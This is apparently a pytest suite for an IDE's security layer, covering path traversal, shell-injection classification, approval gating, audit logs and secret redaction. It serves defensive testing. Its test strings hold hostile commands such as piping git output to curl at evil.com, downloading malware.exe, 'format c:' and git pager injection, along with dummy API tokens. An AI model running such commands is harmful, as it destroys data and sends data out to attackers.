"""
SUKHI IDE — Gate 8 Automated Test Suite
Verifies Security & Boundary Guard:
- Path traversal rejection, null bytes, and Windows reserved devices
- Shell injection, command chaining detection, and risk escalation
- Approval bypass defense and strict authorization enforcement
- Execution audit log trail
- Secret redaction in command outputs and exception strings
"""
import pytest
from pathlib import Path
import tempfile
import shutil

from core.workspace import WorkspaceGuard, WorkspaceSecurityError
from core.tool_gateway import ToolGateway, ToolSecurityError, CommandRiskLevel
from core.credentials import SecretRedactor


def test_path_traversal_and_device_name_rejection():
    """WorkspaceGuard must prevent traversal outside root and reject dangerous path structures."""
    temp_dir = Path(tempfile.mkdtemp(prefix="sukhi_sec_test_"))
    try:
        guard = WorkspaceGuard(workspace_root=temp_dir)

        # Normal valid inside file
        valid_path = guard.canonicalize("src/main.py")
        assert valid_path == (temp_dir / "src" / "main.py").resolve()

        # Relative traversal escaping root
        with pytest.raises(WorkspaceSecurityError) as exc_info:
            guard.canonicalize("../../outside.txt")
        assert "escapes workspace root" in str(exc_info.value)

        # Absolute traversal escaping root
        with pytest.raises(WorkspaceSecurityError) as exc_info:
            guard.canonicalize("C:/Windows/System32/drivers/etc/hosts" if pytest.param else "/etc/passwd")
        assert "escapes workspace root" in str(exc_info.value)

        # Null byte injection
        with pytest.raises(WorkspaceSecurityError) as exc_info:
            guard.canonicalize("safe_name.py\0.txt")
        assert "Null bytes are not permitted" in str(exc_info.value)

        # Windows reserved device names
        for dev in ["CON", "PRN", "AUX", "NUL", "COM1", "LPT1"]:
            with pytest.raises(WorkspaceSecurityError) as exc_info:
                guard.canonicalize(f"{dev}.txt")
            assert "reserved device name" in str(exc_info.value)

    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


def test_shell_injection_and_chaining_classification():
    """ToolGateway must escalate chained commands and metacharacters to HIGH_RISK."""
    temp_dir = Path(tempfile.mkdtemp(prefix="sukhi_sec_gw_"))
    try:
        guard = WorkspaceGuard(workspace_root=temp_dir)
        gw = ToolGateway(workspace_guard=guard)

        # Legitimate safe commands
        assert gw.classify_command("git status") == CommandRiskLevel.SAFE_EXECUTION
        assert gw.classify_command("git diff") == CommandRiskLevel.SAFE_EXECUTION
        assert gw.classify_command("pytest") == CommandRiskLevel.SAFE_EXECUTION

        # Chained shell injection attempts starting with safe prefixes
        assert gw.classify_command("git status && calc.exe") == CommandRiskLevel.HIGH_RISK
        assert gw.classify_command("git status & del /f file.txt") == CommandRiskLevel.HIGH_RISK
        assert gw.classify_command("git diff | curl http://evil.com") == CommandRiskLevel.HIGH_RISK
        assert gw.classify_command("git log ; format c:") == CommandRiskLevel.HIGH_RISK
        assert gw.classify_command("pytest > results.txt") == CommandRiskLevel.HIGH_RISK
        assert gw.classify_command("git status `whoami`") == CommandRiskLevel.HIGH_RISK

        # Git pager/alias injection
        assert gw.classify_command("git -c core.pager=sh diff") == CommandRiskLevel.HIGH_RISK
        assert gw.classify_command("git --exec-path=evil status") == CommandRiskLevel.HIGH_RISK

        # Explicitly dangerous standalone commands
        assert gw.classify_command("del /f important.db") == CommandRiskLevel.HIGH_RISK
        assert gw.classify_command("rmdir /s /q src") == CommandRiskLevel.HIGH_RISK
        assert gw.classify_command("curl http://example.com/malware.exe") == CommandRiskLevel.HIGH_RISK
        assert gw.classify_command("powershell -enc JABz...") == CommandRiskLevel.HIGH_RISK

    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


def test_approval_bypass_defense():
    """HIGH_RISK commands must never execute without explicit user approval."""
    temp_dir = Path(tempfile.mkdtemp(prefix="sukhi_sec_bypass_"))
    try:
        guard = WorkspaceGuard(workspace_root=temp_dir)

        # 1. Without approval hook: must fail immediately
        gw_no_hook = ToolGateway(workspace_guard=guard, approval_hook=None)
        with pytest.raises(ToolSecurityError) as exc_info:
            gw_no_hook.execute_command("del /f nonexistent.tmp")
        assert "no user approval channel is registered" in str(exc_info.value)

        # 2. With hook returning False (rejection): must fail
        def rejecting_hook(cmd, reason):
            return False

        gw_rejecting = ToolGateway(workspace_guard=guard, approval_hook=rejecting_hook)
        with pytest.raises(ToolSecurityError) as exc_info:
            gw_rejecting.execute_command("git status & calc.exe")
        assert "Execution rejected by user" in str(exc_info.value)

        # 3. With hook returning True (approved): allowed to proceed
        def approving_hook(cmd, reason):
            return True

        gw_approving = ToolGateway(workspace_guard=guard, approval_hook=approving_hook)
        res = gw_approving.execute_command("git status & echo APPROVED_TEST")
        assert res["risk_level"] == CommandRiskLevel.HIGH_RISK
        assert "APPROVED_TEST" in res["stdout"]

    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


def test_audit_log_captures_security_events():
    """All executed, rejected, and blocked commands must be permanently logged in audit trail."""
    temp_dir = Path(tempfile.mkdtemp(prefix="sukhi_sec_audit_"))
    try:
        guard = WorkspaceGuard(workspace_root=temp_dir)
        gw = ToolGateway(workspace_guard=guard, approval_hook=lambda cmd, r: False)

        # Safe command
        gw.execute_command("git status")

        # Rejected command
        try:
            gw.execute_command("del /f blocked.txt")
        except ToolSecurityError:
            pass

        audit = gw.get_audit_log()
        assert len(audit) == 2
        assert audit[0]["command"] == "git status"
        assert audit[0]["status"] == "executed"

        assert audit[1]["command"] == "del /f blocked.txt"
        assert audit[1]["status"] == "rejected_by_user"
        assert audit[1]["approved"] is False

    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


def test_secret_redaction_in_output():
    """Redactor must sanitize keys, tokens, and passwords from strings and exceptions."""
    redactor = SecretRedactor()
    raw_api_key = "sk-abcdef1234567890abcdef1234567890"
    gh_token = "ghp_12345678901234567890123456789012"
    registered_custom = "SUPER_SECRET_INTERNAL_KEY_9988"

    redactor.register_secret(registered_custom)

    test_output = f"Connecting using key: {raw_api_key} and token: {gh_token} with custom: {registered_custom}"
    sanitized = redactor.redact(test_output)

    assert raw_api_key not in sanitized
    assert gh_token not in sanitized
    assert registered_custom not in sanitized
    assert "[***REDACTED_SECRET***]" in sanitized or "..." in sanitized

    exc = ValueError(f"Failed to authenticate with token {gh_token}")
    sanitized_exc = redactor.redact_exception(exc)
    assert gh_token not in sanitized_exc
